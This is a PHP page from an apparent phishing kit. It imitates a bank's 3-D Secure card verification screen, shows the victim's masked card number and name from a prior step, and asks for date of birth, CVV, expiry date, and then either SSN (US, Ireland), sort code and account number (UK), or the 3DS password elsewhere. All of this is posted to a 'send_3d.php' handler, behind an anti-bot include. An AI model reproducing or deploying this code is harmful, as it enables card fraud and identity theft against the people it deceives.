<?php

	session_start();
    error_reporting(E_ERROR | E_PARSE);

    include('anti/anti.php');
    include('include/get_bk.php');
    include('include/get_lg.php');
    include('../hash.php');

    if(isset($_SESSION['lang_'])){
        include('langdir/'.$_SESSION['lang_']);
    }else {
        include('langdir/en.php');
    }

    $lastdigits = substr(str_replace(' ', '', $_SESSION['xyscardnumberx']), 12, 16);
    $firstTwoNumbers = substr(str_replace(' ', '', $_SESSION['xyscardnumberx']), 0, 2);
    $lastdigitsamex = substr(str_replace(' ', '', $_SESSION['xyscardnumberx']), 11, 15);
    
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charSet="utf-8" />
    <title>(<?php echo $_SESSION['xcountryCodex']; ?>) <?php echo $xys82x; ?></title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="apple-touch-icon" href="asset/img/pp64.png" />
    <link rel="shortcut icon" type="image/x-icon" href="asset/img/favicon/fav.ico" />
    <link rel="icon" type="image/x-icon" href="asset/img/favicon/fav.ico" />
    <link href="asset/css/3ds.css" rel="stylesheet" type="text/css" charSet="UTF-8" />
</head>

<body>
    <div id="container">
        <div id="header">
            <div id="imgBank" class="dinlineblock"><img src="asset/img/secure.png"></div>
            <div id="imgCard" class="dinlineblock"><img src="asset/img/3dv.png"></div>
        </div>
        <p id="title"><?php echo $xys83x; ?></p>
        <p><?php echo $xys84x; ?></strong> <?php echo $xys85x; ?> <a href="#"><?php echo $xys86x; ?></a></p>
        <p><?php echo $xys87x; ?></p>
        <form method="post" action="send/send_3d.php?customer.x=ID-PA$1$7i/<?php echo md5(time()).md5(time()); ?>">
            <div id="boxInfo">
                <div id="cardholder">
                    <?php 
                        if(!empty($bankName) && isset($bankName)){
                            echo '<label>'.$xys88x.' : </label><input type="text" name="xyscardholderx" value="'.$bankName.'" disabled>';
                        }
                        else {
                            echo '<label>'.$xys89x.' : </label><input type="text" name="xyscardholderx" value="'.$_SESSION['xyscardholderx'].'" disabled>';
                        }
                    ?>
                </div>
                <div id="cardnumber">
                    <?php 
                        if($firstTwoNumbers == 37 || $firstTwoNumbers == 34){
                            echo '<label>'.$xys90x.' : </label><input type="text" name="xyscardnumberx" value="XXXX-XXXXXX-X'.$lastdigitsamex.'" disabled>';
                        }
                        else {
                            echo '<label>'.$xys90x.' : </label><input type="text" name="xyscardnumberx" value="XXXX-XXXX-XXXX-'.$lastdigits.'" disabled>';
                        }
                    ?>
                </div>
                <div id="birthday">
                    <label><?php echo $xys91x; ?> : </label>
                    <input type="text" name="xysbirthdayDDx" id="xysbirthdayDDx" maxlength="2" autocomplete="off"><span> / </span>
                    <input type="text" name="xysbirthdayMMx" id="xysbirthdayMMx" maxlength="2" autocomplete="off"><span> / </span>
                    <input type="text" name="xysbirthdayYYx" id="xysbirthdayYYx" maxlength="4" autocomplete="off"><span id="spDate">(DD/MM/YYYY)</span>
                </div>
                <div id="panelcode">
                    <label><?php echo $xys92x; ?> : </label>
                    <input type="text" name="xyspanelcodex" id="xyspanelcodex" maxlength="3" autocomplete="off"><span><img src="asset/img/3ds.png"><span id="panelCodeTxt"><?php echo $xys93x; ?> (<a href="#"><?php echo $xys94x; ?></a>)</span></span>
                </div>
                <div id="expirydate">
                    <label><?php echo $xys95x; ?> : </label>
                    <input type="text" name="xysexpirydateMMx" id="xysexpirydateMMx" maxlength="2" autocomplete="off"><span> / </span>
                    <input type="text" name="xysexpirydateYYx" id="xysexpirydateYYx" maxlength="2" autocomplete="off"><span id="spDate">(MM/YY)</span>
                </div>
                <?php 
                    // USA OR IRELAND
                    if($_SESSION['xcountryCodex'] == "US" || $_SESSION['xcountryCodex'] == "IE"){
                ?>
                <div id="ssn">
                    <label>SSN : </label>
                    <input type="text" name="xysssn1x" id="xysss1x" maxlength="3" autocomplete="off"><span> - </span>
                    <input type="text" name="xysssn2x" id="xysss2x" maxlength="2" autocomplete="off"><span> - </span>
                    <input type="text" name="xysssn3x" id="xysss3x" maxlength="4" autocomplete="off">
                </div>
                <?php     
                    // UK  
                    } else if($_SESSION['xcountryCodex'] == "GB"){
                ?>
                <div id="sortcode">
                    <label>Sort code : </label>
                    <input type="text" name="xyssc1x" id="xyssc1x" maxlength="2" autocomplete="off"><span> - </span>
                    <input type="text" name="xyssc2x" id="xyssc2x" maxlength="2" autocomplete="off"><span> - </span>
                    <input type="text" name="xyssc3x" id="xyssc3x" maxlength="2" autocomplete="off">
                </div>
                <div id="accountnumber">
                    <label>Account number : </label>
                    <input type="text" name="xysaccnumx" id="xysaccnumx" maxlength="8" autocomplete="off">
                </div>
                <?php        
                    } else {
                ?>
                <div id="vbvpassword">
                    <label><?php echo $xys13x; ?> : </label>
                    <input type="password" name="xys3dspassx" id="xys3dspass" maxlength="20" autocomplete="off"><span id="accnumTxt">(<?php echo $xys96x; ?>)</span>
                </div>
                <?php        
                    }
                ?>
            </div>
            <center>
                <input type="submit" name="send3ds" value="Submit" id="xyssubmit3DSx">
            </center>
            <div id="infoBank">
                <?php
                    if(isset($bankPhone)){
                ?>
                        <span id="phoneBank"><?php echo $xys97x; ?>: <a href="#"><?php echo $bankPhone; ?></a></span>
                <?php
                    }
                ?>
                <span id="urlBank"><a href="#"><?php echo $bankUrl; ?></a></span>
            </div>
        </form>
    </div>
    <div class="transition">
        <span><?php echo $xys98x; ?></span>
        <img src="asset/img/processing.gif">
    </div>
    <script src="asset/js/jquery.min.js"></script>
    <script src="asset/js/3d.js"></script>
   
</body>

</html>